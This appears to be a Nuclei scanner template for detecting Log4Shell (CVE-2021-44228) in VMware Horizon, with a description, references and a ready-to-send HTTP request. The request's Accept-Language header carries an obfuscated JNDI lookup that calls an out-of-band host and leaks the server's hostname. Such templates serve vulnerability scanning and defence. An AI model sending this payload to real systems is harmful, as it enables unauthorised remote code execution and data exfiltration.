# Nuclei Template: VMware Horizon - JNDI Remote Code Execution (Apache Log4j)
**Template ID:** vmware-horizon-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vmware-horizon-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware Horizon is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
GET /portal/info.jsp HTTP/1.1
Host: {{Hostname}}
Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
```

## References
- https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
- https://www.vmware.com/security/advisories/VMSA-2021-0028.html
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
